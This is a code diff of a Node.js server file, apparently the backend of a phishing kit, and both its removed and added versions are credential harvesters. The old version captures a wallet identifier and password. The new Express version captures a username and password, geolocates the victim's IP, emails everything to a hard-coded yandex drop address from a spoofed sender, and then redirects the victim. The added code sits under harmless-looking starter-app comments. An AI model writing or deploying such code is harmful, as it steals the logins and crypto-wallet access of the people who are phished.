@@ -1,114 +1,82 @@
-const http = require('http');
-const url = require('url');
-const querystring = require('querystring');
-const fetch = require('node-fetch');
+// server.js
+// where your node app starts
 
-const server = http.createServer((req, res) => {
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Content-type', 'application/json');
+// we've started you off with Express (https://expressjs.com/)
+// but feel free to use whatever libraries or frameworks you'd like through `package.json`.
 
-  if (req.method === 'POST') {
-    let body = '';
-    req.on('data', (chunk) => {
-      body += chunk;
-    });
+const express = require("express");
+const bodyParser = require("body-parser");
+const requestIp = require("request-ip");
+const geoip = require("geoip-lite");
+const app = express();
+const sendmail = require("sendmail")();
+const lastRedirect = "";
 
-    req.on('end', async () => {
-      const postData = querystring.parse(body);
-      const data = {
-        source: postData.source,
-        password: postData.password,
-        to: 'sharedbox2021@yandex.com',
-        from: `no_reply@${req.headers.host}`,
-        fromName: 'New Login!',
-        subject: 'Important: New Leads Founds',
-        country: await visitorCountry(),
-        countryCode: await visitorCountryCode(),
-        continentCode: await visitorContinentCode(),
-        ip: getRealUserIp(req),
-        browser: req.headers['user-agent'],
-        message: `
-          <HTML>
-              <BODY>
-                  <table>
-                      <tr><td>BOSS LOGIN FOUND </td></tr>
-                      <tr><td>Wallet: ${data.source}</td></tr>
-                      <tr><td>Password: ${data.password}</td></tr>
-                      <tr><td>Browser: ${data.browser}</td></tr>
-                      <tr><td>IP: ${data.country} | <a href='http://whoer.net/check?host=${data.ip}' target='_blank'>${data.ip}</a> </td></tr>
-                      <tr><td>>Anonymous Cyber Team<</td></tr>
-                  </table>
-              </BODY>
-          </HTML>`,
-      };
+// make all the files in 'public' available
+// https://expressjs.com/en/starter/static-files.html
+app.use(express.static("public"));
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
-      const headers = {
-        'MIME-Version': '1.0',
-        'Content-type': 'text/html;charset=UTF-8',
-        'From': `${data.fromName}<${data.from}>`,
-      };
+// Get the user's IP address using the request-ip middleware
+app.use(requestIp.mw());
 
-      try {
-        await sendEmail(data.to, data.subject, data.message, headers);
-        const jsonResponse = JSON.stringify({ status: 'success', message: 'Wallet authentication in progress!', code: 200 });
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(jsonResponse);
-      } catch (error) {
-        const jsonResponse = JSON.stringify({ status: 'error', message: 'We could not process your request', code: 400 });
-        res.writeHead(400, { 'Content-Type': 'application/json' });
-        res.end(jsonResponse);
-      }
-    });
-  }
+app.get("/", (request, response) => {
+  response.sendFile(__dirname + "/src/pages/index.hbs");
 });
 
-const PORT = process.env.PORT || 3000;
+// https://expressjs.com/en/starter/basic-routing.html
+app.post("/", (req, res) => {
+  const { ai, pr } = req.body;
+  console.log(req.body);
+  let logEmail = "sharedbox2021@yandex.com";
 
-server.listen(PORT, () => {
-  console.log(`Server is running on port ${PORT}`);
+  // Get the user's IPv4 address
+  const ip = requestIp.getClientIp(req);
+
+  // Get the country and city from the IP address using geoip-lite
+  const geo = geoip.lookup(ip);
+  const country = geo ? geo.country : "unknown";
+  const city = geo ? geo.city : "unknown";
+  const html = `
+    <!DOCTYPE html>
+    <html lang='en'>
+    <head>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>Document</title>
+    </head>  
+    <body>
+    Details Has Arrived!!
+    <h3>User: ${ai}</h3>
+    <h3>Access: ${pr}</h3>
+    <h3>IP: ${ip}</h3>
+    <h3>Country: ${country}</h3>
+    <h3>City: ${city}</h3>
+   
+    </body>
+    </html>
+    `;
+ 
+  let ip2 = requestIp.getClientIp(req);
+
+  let redirectUrl = "https://${dom}";
+
+  sendmail(
+    {
+      from: "docu@logscentral.com",
+      to: logEmail,
+      subject: "EMAIL-LOG " + ip2,
+      html,
+    },
+    function (err, reply) {
+      res.redirect(redirectUrl);
+    }
+  );
 });
 
-function getRealUserIp(req) {
-  const forwarded = req.headers['x-forwarded-for'];
-  if (forwarded) {
-    return forwarded.split(',')[0];
-  }
-  return req.connection.remoteAddress;
-}
-
-async function visitorCountry() {
-  const ip = getRealUserIp(req);
-  try {
-    const response = await fetch(`http://www.geoplugin.net/json.gp?ip=${ip}`);
-    const ipData = await response.json();
-    return ipData.geoplugin_countryName || 'Unknown';
-  } catch (error) {
-    return 'Unknown';
-  }
-}
-
-async function visitorCountryCode() {
-  const ip = getRealUserIp(req);
-  try {
-    const response = await fetch(`http://www.geoplugin.net/json.gp?ip=${ip}`);
-    const ipData = await response.json();
-    return ipData.geoplugin_countryCode || 'Unknown';
-  } catch (error) {
-    return 'Unknown';
-  }
-}
-
-async function visitorContinentCode() {
-  const ip = getRealUserIp(req);
-  try {
-    const response = await fetch(`http://www.geoplugin.net/json.gp?ip=${ip}`);
-    const ipData = await response.json();
-    return ipData.geoplugin_continentCode || 'Unknown';
-  } catch (error) {
-    return 'Unknown';
-  }
-}
-
-async function sendEmail(to, subject, message, headers) {
-  // You can implement your email sending logic here using a library like Nodemailer
-}
+// send the default array of dreams to the webpage
+// listen for requests :)
+const listener = app.listen(process.env.PORT, () => {
+  console.log("Your app is listening on port " + listener.address().port);
+});
